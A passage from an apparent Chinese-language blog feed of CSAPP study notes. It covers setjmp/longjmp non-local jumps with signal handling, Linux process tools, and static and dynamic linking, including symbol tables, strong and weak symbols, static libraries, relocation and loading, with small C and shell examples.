class="headerlink" title="非本地跳转"></a>非本地跳转</h1><p>C语言提供了一种用户级异常控制流形式，称为非本地跳转（nonlocaljump），它将控制直接从一个函数转移到另一个当前正在执行的函数，而不需要经过正常的调用-返回序列。</p><p>非本地跳转是通过 setjmp 和 longjmp 函数来提供的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;setjmp.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">setjmp</span><span class="hljs-params">(jmp_buf env)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">sigsetjmp</span><span class="hljs-params">(sigjmp_buf env, <span class="hljs-type">int</span> savesigs)</span>;<br></code></pre></td></tr></table></figure><p>setjmp 函数在 env 缓冲区中保存当前调用环境，以供后面的 longjmp 使用，并返回 0。</p><p>longjmp 函数从 env 缓冲区种回复调用环境，然后触发一个从最近一次初始化 env 的 setjmp 的调用返回，返回值非零。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;setjmp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br>jmp_buf buf;<br><br><span class="hljs-type">int</span> error1 = <span class="hljs-number">1</span>;<br><span class="hljs-type">int</span> error2 = <span class="hljs-number">1</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">foo</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>, <span class="hljs-title function_">bar</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">switch</span> (setjmp(buf)) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>        foo();<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Detected an error1 condition in foo\n&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Detected an error2 condition in foo\n&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Unknown error condition in foo\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">/* Deeply nested function foo */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">foo</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;call in foo\n&quot;</span>);<br>    <span class="hljs-keyword">if</span> (error1)<br>        longjmp(buf, <span class="hljs-number">1</span>);<br>    bar();<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bar</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;call in bar\n&quot;</span>);<br>    <span class="hljs-keyword">if</span> (error2)<br>        longjmp(buf, <span class="hljs-number">2</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p> <code>setjmp</code> 函数调用一次返回多次，调用会把当前状态保存在 <code>buf</code> 中并返回 0。直到后面遇到 <code>longjmp</code> 时，会根据保存的位置恢复寄存器状态，并将返回值置为第二个参数。</p><p>非本地跳转的另一个妙用是可以在接收信号的时候不返回被中断的位置，也不直接退出，而是可以重新指定跳转位置。</p><p>如下，当用户在键盘上键入 Ctrl+C 时，这个程序用信号和非本地跳转来实现软重启：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;setjmp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><br>sigjmp_buf buf;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">handler</span><span class="hljs-params">(<span class="hljs-type">int</span> sig)</span><br>&#123;<br>    siglongjmp(buf, <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (!sigsetjmp(buf, <span class="hljs-number">1</span>)) &#123;<br>        signal(SIGINT, handler);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;starting&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;restarting&quot;</span>);<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        sleep(<span class="hljs-number">1</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;processing...&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">/* Control never reaches here */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>在 <code>while 1</code> 中当我们按下 <code>Ctrl+C</code>，指令在循环中的一个地方被中断。如果没有 <code>setjmp</code> 和 <code>longjmp</code> 的处理，那么我们收到这个信号之后，要么接着回去（return），要么退出（exit），但是有了这两个函数，我们就可以设置一个点位，让它信号处理完毕之后都回到那个点位去。</p><h1 id="操作进程的工具"><a href="#操作进程的工具" class="headerlink" title="操作进程的工具"></a>操作进程的工具</h1><p>Linux 为我们提供了大量操作进程的工具</p><ul><li><strong>STRACE：</strong>打印一个正在运行的程序和它的子进程调用的每个系统调用的轨迹。</li><li><strong>PS：</strong>列出当前系统中的进程（包括僵死进程）。</li><li><strong>TOP：</strong>打印出关于当前进程资源使用的信息。</li><li><strong>PMAP：</strong>显示进程的内存映射。</li><li><strong>&#x2F;proc：</strong>一个虚拟文件系统，以 ASCII 文本格式输出大量内核数据结构的内容，用户程序可以读取这些内容。比如，输入 “cat&#x2F;proc&#x2F;loadavg”，可以看到 Linux 系统上当前的平均负载。</li></ul><hr><p>讲的很细很细，有一点难懂，还是需要沉淀一下🫠</p><p>为什么最近总是困困的</p>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>CSAPP，异常</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP 第七章 链接</title>
    <link href="/2023/11/28/CSAPP-%E7%AC%AC%E4%B8%83%E7%AB%A0-%E9%93%BE%E6%8E%A5/"/>
    <url>/2023/11/28/CSAPP-%E7%AC%AC%E4%B8%83%E7%AB%A0-%E9%93%BE%E6%8E%A5/</url>
    
    <content type="html"><![CDATA[<p>动态链接和静态链接</p><span id="more"></span><p>链接（linking）：将各种代码和数据片段收集并组合成为一个单一文件的过程，这个文件可被加载（复制）到内存并执行。就是我们之前有学过的编译文件的最后一步，分静态和动态链接两种可能。</p><p>在现代系统中，链接是由叫做链接器（linker）的程序自动执行的。</p><h1 id="编译器驱动程序"><a href="#编译器驱动程序" class="headerlink" title="编译器驱动程序"></a>编译器驱动程序</h1><p>我们这一章都是在用下面的小函数示例讲解学习的：</p><blockquote><p>这是两个源文件分别是 main.c 和 sum.c</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//main.c</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">int</span> *a, <span class="hljs-type">int</span> n)</span>;<br><span class="hljs-type">int</span> arry[<span class="hljs-number">2</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>&#125;<br><br><span class="hljs-type">int</span> main()<br>&#123;<br><span class="hljs-type">int</span> val=sum(<span class="hljs-built_in">array</span>,<span class="hljs-number">2</span>);<br><span class="hljs-keyword">return</span> val;<br>&#125;<br><br><span class="hljs-comment">//sum.c</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">int</span> *a,<span class="hljs-type">int</span> n)</span><br>&#123;<br>    <span class="hljs-type">int</span> i,s=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        s+=a[i]<br>    &#125;<br>    <span class="hljs-keyword">return</span> s;<br>&#125;<br></code></pre></td></tr></table></figure><p>大多编译系统提供编译器驱动程序（如 gcc ），它实际上是广义的”编译器“，是语言预处理器、编译器、汇编器和连接器的集合。</p><p>我们可以使用下面的命令把两个文件链接在一起编译：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -o prog main.c sum.c<br></code></pre></td></tr></table></figure><p>当然也可以将这个命令拆来来编译：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#预编译：展开头文件和替换宏定义</span><br>cpp main.c /tmp/main.i<br><br><span class="hljs-comment">#编译：将高级语言翻译成低级语言</span><br>cc1 /tmp/main.i /tmp/main.s<br><br><span class="hljs-comment">#汇编：将汇编语言翻译成机器语言</span><br>as /tmp/main.s /tmp/main.o<br><br><span class="hljs-comment">#sum.c文件相同。</span><br><span class="hljs-comment">#链接：将文件连接在一起生成可执行文件</span><br>ld -o prog /tmp/main.o /tmp/sum.o <br></code></pre></td></tr></table></figure><h1 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h1><p>我们的命令 ld 就是调用了 Linux LD 程序这样的静态链接器，它以一组可重定位目标文件和命令行参数作为输入，生成一个完全连接的、可以加载和运行的可执行目标文件作为输入。</p><p>连接器要完成两个主要任务才能实现链接目的：</p><ul><li>符号解析：将每个符号引用和一个符号定义关联起来</li><li>重定位：编译器和汇编器生成从地址 0 开始的代码和数据节，将每一个符号引用和一个内存位置关联起来。</li></ul><h1 id="目标文件"><a href="#目标文件" class="headerlink" title="目标文件"></a>目标文件</h1><p>目标文件有三种形式：</p><ul><li>可重定位目标文件（.o）：包含二进制代码和数据，其形式可以在编译时与其他可重定位目标文件合并起来，创建一个可执行目标文件。</li><li>可执行目标文件（.elf）：包含二进制代码和数据，其形式可以被直接复制到内存并执行。</li><li>共享目标文件（.libc）：一种特殊类型的可重定位目标文件，可以在加载或者运行时被动态地加载进内存并链接。</li></ul><h1 id="可重定目标文件"><a href="#可重定目标文件" class="headerlink" title="可重定目标文件"></a>可重定目标文件</h1><p>可重定目标文件分成几个部分：</p><ul><li>.text：已编译程序的机器代码段</li><li>.rodata：只读数据段</li><li>.data：已初始化的全局变量和静态变量</li><li>.bss：未初始化全局变量和静态变量</li><li>.symtab：符号表，保存全局变量的信息。默认生成，可以使用STRIP命令去除。</li><li>.rel.text：一个.text 借中的位置表，被链接的时候会被修改位置。</li><li>.rel.data：被模块引用或定义的所有全局变量的重定位信息，被链接的时候会被修改位置。</li><li>.debug：调试符号表，只有以 -g 选项时会得到这张表，其中包含了局部变量的定义和类型，以及原始的 C 文件，只有 -g 命令会生成这张表。</li><li>.line：原始 C源程序中的行号和text 节中机器指令之间的映射。只有以-g 选项调用编译器驱动程序时，才会得到这张表。</li><li>.strtab：一个字符串表，其内容包括 .symtab 和 .debug 节中的符号表，以及节头部中的节名字。</li></ul><p>同是程序中的变量，区分 .bss 段 .data 段的原因是初始化的变量需要使用一段空间去保存初始化得到的值，而未初始化则不需要， .bss 段存储为初始化数据可以更好的节省空间</p><h1 id="符号和符号表"><a href="#符号和符号表" class="headerlink" title="符号和符号表"></a>符号和符号表</h1><p>每个<strong>可重定位目标</strong>模块 m 都有一个符号表，它包含 m 定义和引用的符号的信息。在链接器的上下文中，有三种不同的符号：</p><ul><li><p>模块 m 定义并能被其他模块引用的全局符号。全局链接器符号对应于非静态的C函数和全局变量。</p></li><li><p>由其他模块定义并被模块 m 引用的全局符号。</p></li><li><p>只被模块 m 定义和引用的局部符号。它们对应了带 static 属性的 C 函数和全局变量。</p></li></ul><p>.symtab 中的符号表并不包含对应于本地非静态程序变量的任何符号。这些符号在运行时在栈中被管理，连接器对此类符号不感兴趣。</p><p>静态的局部变量不会在栈中管理，会放到 bss 或者是 data 段上。</p><p>.symtab 节中会包含一个 ELF 符号表，这张符号表包含这样一个结构体条目的数组：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">int</span> name;        <span class="hljs-comment">/* String table offset */</span><br>    <span class="hljs-type">char</span> type:<span class="hljs-number">4</span>,     <span class="hljs-comment">/* Function or data (4 bits) */</span><br>    binding:<span class="hljs-number">4</span>;       <span class="hljs-comment">/* Local or global (4 bits) */</span><br>    <span class="hljs-type">char</span> reserved;   <span class="hljs-comment">/* Unused */</span><br>    <span class="hljs-type">short</span> section;   <span class="hljs-comment">/* Section header index */</span><br>    <span class="hljs-type">long</span> value;      <span class="hljs-comment">/* Section offset or absolute address */</span><br>    <span class="hljs-type">long</span> size;       <span class="hljs-comment">/* Object size in bytes */</span><br>&#125; Elf64_Symbol;<br></code></pre></td></tr></table></figure><p>每个符号都被分配到目标文件的某个节，由 section 字段表示，该字段也是一个到节头部表的索引。</p><p>对于 section 字段有三个特殊的伪节，它们在节头部表中是没有条目的：</p><ul><li>ABS 代表不该被重定位的符号。</li><li>UNDEF 代表未定义的符号，也就是在本目标模块中用，但是却在其他地方定义的符号。</li><li>COMMON 表示还未被分配位置的未初始化的数据目标。</li></ul><blockquote><p>现代的GCC 版本根据以下规则来将可重定位目标文件中的符号分配到 COMMON 和 bss 中：</p><p>COMMON：未初始化的全局变量</p><p>.bss ：未初始化的静态变量，以及初始化为 0 的全局或静态变量</p></blockquote><h1 id="符号解析"><a href="#符号解析" class="headerlink" title="符号解析"></a>符号解析</h1><p>链接器解析符号引用的方法是将每个引用与它输入的可重定位目标文件的符号表中的一个确定的符号定义关联起来。</p><p>静态局部变量也会有本地链接器符号，编译器还要确保它们拥有唯一的名字。不过，对全局符号的引用解析就棘手得多。当编译器遇到一个不是在当前模块中定义的符号（变量或函数名）时，会<strong>假设该符号是在其他某个模块中定义的，生成一个链接器符号表条目，并把它交给链接器处理</strong>。</p><p>如果链接器在它的任何输人模块中都找不到这个被引用符号的定义，就输出一条(通常很难阅读的)错误信息并终止。</p><p>例如下面的文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">foo</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>foo();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们编译和链接这个源文件，编译器会没有障碍地运行，但是当链接器无法解析对 foo 的引用时，就会终止。</p><h3 id="连接器如何解析多重定义的全局符号"><a href="#连接器如何解析多重定义的全局符号" class="headerlink" title="连接器如何解析多重定义的全局符号"></a>连接器如何解析多重定义的全局符号</h3><p>连接器会将模块与对应的符号一一对应，如果碰到两个模块同名的情况，就不面具发生混淆。</p><p>首先我们要理解一个强弱符号的概念：</p><p>在编译时，编译器向汇编器输出每个全局符号，或者是强或者是弱，而汇编器把这个信息隐含地编码在可重定位目标文件的符号表里。函数和已初始化的全局变量是强符号，未初始化的全局变量是弱符号。</p><p>而根据强弱符号的定义，Linux 链接器使用下面的规则来处理多重定义的符号名。规则：</p><ul><li>不允许有多个同名的强符号</li><li>如果有一个强符号和多个弱符号同名，那么选择强符号</li><li>如果有多个弱符号同名，那么从这些弱符号中任意选择一个</li></ul><p>有一个问题是：连接器只会对全局符号双重定义问题发出警告而不是报错。</p><p>例如在两个模块链接在一起的模块中分别定义了 <code>double x;</code> 和 <code>int x;</code> ，它只会触发一个警告而不是报错。这就会导致我们定义了相同的两个符号，编译到一起之后，两边的函数操作的是同一个变量，而我们很难发现问题所在。</p><p>为了避免这类错误，我们尽量加上 <code>-fno-common</code> 标志来高速链接器遇到多重符号定义的时候触发一个错误。</p><h3 id="与静态库链接"><a href="#与静态库链接" class="headerlink" title="与静态库链接"></a>与静态库链接</h3><p>我们可以把所有标准函数都编译在一个<strong>可重定目标文件</strong>里，再通过下面的命令链接到自己的可执行文件中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc main.c /usr/lib/libc.o<br></code></pre></td></tr></table></figure><p>但是这个方法对内存和磁盘空间来说都是极大的浪费，并且如果某一个模块发生了改变就要重新编译整个文件，维护和开发也很复杂。</p><p>所以静态库概念被提出来，以解决这些缺点。</p><p>在 Linux 系统中，静态库以一种称为存档（archive）的特殊文件格式存放在磁盘中。</p><p>静态库允许将所有相关的目标模块打包成一个单独的文件，用作连接器的输入，并以一种称为存档（archive）的特殊文件格式存放在磁盘中。</p><blockquote><p>存档文件是一组连接起来的可重定位目标文件的集合，有一个头部用来描述每个成员目标文件的大小和位置。存档文件名由后缀 <code>.a</code> 标识。</p></blockquote><p>当链接器构造一个输出的可执行文件时，它只复制静态库里被应用程序引用的目标模块。例如我们调用C标准库和数学库中的函数：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">gcc main.c <span class="hljs-regexp">/usr.lib/</span>libm.a usr<span class="hljs-regexp">/lib/</span>libc.a<br></code></pre></td></tr></table></figure><p>这就减少了可执行文件在磁盘和内存中的大小，同时应用程序员只需要包含较少的库文件的名字（C 编译器驱动程序总是默认传送 libc.a 给链接器，所以我们在命令行中可以省略对 lbc.a 的引用）。</p><p>用命令 <code>ar rcs out.a xx1.o xx2.o ....</code> 命令把可重定位文件整合成 <code>out.a</code> 静态库。链接的时候，我们需要将我们编译出的可重定向文件和静态库文件一起作为链接器的数。</p><h3 id="连接器如何使用静态库来解析引用"><a href="#连接器如何使用静态库来解析引用" class="headerlink" title="连接器如何使用静态库来解析引用"></a>连接器如何使用静态库来解析引用</h3><p>在符号解析阶段，链接器从左到右按照它们在编译器驱动程序命令行上出现的顺序来扫描可重定位目标文件和存档文件。</p><p>链接过程维护了三个集合：</p><ul><li>E：可重定位目标文件，这个集合中的文件会被合并起来形成可执行文件</li><li>U：未解析的符号，即引用了但是尚未定义的符号</li><li>D：在前面输入文件中已定义的符号</li></ul><p>初始时，E、U 和 D 均为空。</p><p>对于命令行上的每一个输入文件，会判断是目标文件还是静态库文件。如果是目标文件，就会修改 U 和 D 来反映文件中的符号引用，并继续下一个文件；如果是存档文件（.a），会对应匹配 U 中的一个引用，如果匹配成功会把对应的符号从 U 删除并加入到 D 中，并且会把 .a 中的对应的模块（.o）加入到 E 集合中，而不包含在 E 中的可重定位文件会被丢弃。</p><p>如果扫描完所有的输入文件之后， U 非空，那么报错推出，否则合并 E 集合的可重定位文件输出可执行文件。</p><p>需要注意的是，如果我们在静态链接的时候，把静态库放在了前面，那么会因为匹配不到任何一个 U 中的符号（因为一开始 U 为空）而直接被链接器丢弃。所以在上面的情况，我们如果使用命令 <code>gcc --static -o a.out libcmath.a main.c</code> 则会报错。</p><h1 id="重定位"><a href="#重定位" class="headerlink" title="重定位"></a>重定位</h1><p>链接器完成符号解析后，就可以开始重定位步骤了。重定位有两个步骤：</p><ul><li>重定位节和符号定义：链接器将所有相同类型的节合并为同一类型的新的聚合节。当这一步完成时，程序中的每条指令和全局变量都有唯一的运行时内存地址了。</li><li>重定位节中的符号引用：链接器修改代码节和数据节中对每个符号的引用，使得它们指向正确的运行时地址。</li></ul><h3 id="重定位条目"><a href="#重定位条目" class="headerlink" title="重定位条目"></a>重定位条目</h3><p>无论何时，汇编器遇到<strong>对最终位置未知的目标引用</strong>，它就会生成一个重定位条目，告诉链接器在将目标文件合并成可执行文件时该如何修改这个引用。其中，代码的重定位条目放在 <code>.rel.text</code> 中，已初始化数据的重定位条目放在 <code>.rel.data</code> 中。</p><p>下面就是重定义位条目的格式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">long</span> offset;    <span class="hljs-comment">/* Offset of the reference to relocate */</span><br><span class="hljs-type">long</span> type:<span class="hljs-number">32</span>，  <span class="hljs-comment">/* Relocation type */</span><br> symbol:<span class="hljs-number">32</span>; <span class="hljs-comment">/* Symbol table index */</span><br><span class="hljs-type">long</span> addend;    <span class="hljs-comment">/* Constant part of relocation expression */</span><br>&#125;Elf64_Rela;<br></code></pre></td></tr></table></figure><p>ELF 定义了32种不同类型的引用，这里我们只关心两种最基本的类型：</p><ul><li>PC 相对寻址 <code>R_X86_64_PC32</code> ：一个PC相对地址就是距程序计数器（PC）的当前运行时值的偏移量</li><li>绝对地址引用 <code>R_X86_64_32</code> ：通过绝对寻址，CPU 直接使用在指令中编码的 32 位值作为有效地址，不需要进一步修改。</li></ul><h3 id="重定位符号引用"><a href="#重定位符号引用" class="headerlink" title="重定位符号引用"></a>重定位符号引用</h3><p>重定位符号引用也分为 PC 相对引用和绝对引用两种。</p><p>判断 PC 相对引用和绝对引用的标准主要取决于指令或数据的寻址方式和地址计算方法。我们需要实现分支跳转和存储数据的指令就会采取 PC 相对引用，例如 call 指令；我们在程序运行时需要确定确切的内存地址来表示目标地址的指令，就需要采用绝对引用，例如 mov 指令。</p><h1 id="可执行目标文件"><a href="#可执行目标文件" class="headerlink" title="可执行目标文件"></a>可执行目标文件</h1><p>可执行目标文件的格式类似于可重定位目标文件的格式，分为以下几个部分：</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%83%E7%AB%A0-%E9%93%BE%E6%8E%A5/7-ELF%E7%BB%93%E6%9E%84.png"></p><p>ELF 头描述文件的总体格式，它还包括程序的入口点（entry point），也就是当程序运行时要执行的第一条指令的地址。</p><p><code>.text</code> 、.rodata 和 <code>.data</code> 节与可重定位目标文件中的节是相似的，不同的是这些节已经被重定位到它们最终的运行时内存地址。</p><p><code>.init</code> 节定义了一个小函数，叫做 init，是程序的初始化代码。</p><p>因为可执行文件是完全链接的（已被重定位），所以它不再需要 <code>.rel</code> 节。</p><p>程序头部表中的其中 LOAD 段会告诉我们哪些段在哪个位置，权限是什么，如下：</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%83%E7%AB%A0-%E9%93%BE%E6%8E%A5/7-ELF%E5%A4%B4%E9%83%A8.png"></p><h1 id="加载可执行文件"><a href="#加载可执行文件" class="headerlink" title="加载可执行文件"></a>加载可执行文件</h1><p>在Linux中运行可执行目标文件prog，可以在Linux shell的命令行运行下面的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./prog<br></code></pre></td></tr></table></figure><p>prog 是文件的名字，shell 通过调用某个驻留在存储器中叫做加载器的操作系统代码来运行它。</p><p>加载器将可执行目标文件中的代码与数据从磁盘复制到内存，然后通过跳转到程序的第一条指令或入口点来运行该程序，这个将程序复制到内存并运行的过程叫做<strong>加载</strong>。</p><p>加载器运行时，它创建如下图所示的内存映像。在程序头部表的引导下,加载器将可执行文件的片复制到代码段和数据段。接下来跳转到程序的入口点 <code>_start</code> 函数，这个函数会调用 <code>libc.so</code> 中的系统启动函数 <code>__libc_start_main</code> 函数去初始化执行环境，最后载调用用户层的 <code>main</code> 函数。</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%83%E7%AB%A0-%E9%93%BE%E6%8E%A5/7-%E5%8A%A0%E8%BD%BD%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6.png"></p><h1 id="动态链接共享库"><a href="#动态链接共享库" class="headerlink" title="动态链接共享库"></a>动态链接共享库</h1><p>之前一直在讨论静态链接的内容，动态链接弥补了静态链接的缺点，致力于解决静态库缺陷的一个现代创新产物。</p><p>共享库是一个目标模块，在运行或加载时，可以加载到任意的内存地址，并和一个在内存中的程序链接起来。这个过程称为<strong>动态链接（dynamic linking）</strong>，是由一个叫做<strong>动态链接器</strong>（dynamic linker）的程序来执行的。</p><p>共享库也称为共享目标（shared object），在 Linux 系统中通常用 .so 后缀来表示。windows操作系统的共享库称为 DLL（动态链接库）。</p><p>静态链接唯一的优势就是不依赖环境，只要架构支持，就一定能运行，而动态链接需要比较严格的环境要求。共享库是在运行时加载，可以加载到任意的内存，因此编译的时候，必须编译位置无关代码。</p><p>我们可以使用下面的命令编译动态链接库：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs C">gcc -shared -fpic -o out.so file1.c file2.c<br>````<br><br> `-shared` 表明生成动态链接库文件，`-fpic` 参数要求生成位置无关代码<br><br>![](/img/CSAPP-第七章-链接/<span 